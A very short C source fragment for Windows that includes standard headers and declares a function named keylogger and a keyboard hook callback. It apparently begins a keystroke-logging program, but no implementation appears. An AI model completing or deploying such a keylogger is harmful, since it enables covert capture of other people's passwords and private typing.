#include <Windows.h>
#include <tchar.h>
#include <stdio.h>

void keylogger();
LRESULT CALLBACK keyboardHook(int, WPARAM, LPARAM);